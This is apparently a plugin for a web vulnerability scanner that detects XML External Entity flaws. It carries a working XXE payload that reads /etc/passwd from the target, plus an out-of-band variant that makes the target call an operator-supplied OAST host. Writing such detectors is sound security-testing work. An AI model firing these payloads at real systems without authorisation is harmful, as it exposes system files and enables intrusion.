"""
XML External Entity (XXE) Plugin
"""
from scanner.plugins.base import BasePlugin

# A classic XXE payload
PAYLOAD = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>"""

class Plugin(BasePlugin):
    """
    XML External Entity (XXE) plugin
    """
    def __init__(self):
        self.name = "xxe"
        self.description = "Detects XML External Entity (XXE) vulnerabilities"

    async def run(self, target: str, requester, oast_server: str = None):
        """
        Run the XML External Entity (XXE) plugin
        """
        # In-band detection
        headers = {"Content-Type": "application/xml"}
        try:
            response = await requester.post(target, data=PAYLOAD, headers=headers)
            if not response or not isinstance(response, dict):
                return None
            content = response.get("text") or ""
            if "root:x:0:0:root" in content:
                return f"XXE vulnerability found at {target}"
        except Exception:
            pass

        # OAST-based detection
        if oast_server:
            oast_payload = f"""<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://{oast_server}"> ]>
<foo>&xxe;</foo>"""
            try:
                await requester.post(target, data=oast_payload, headers=headers)
                return f"OAST-based XXE payload sent. Check your OAST server for interactions."
            except Exception:
                pass
        
        return None
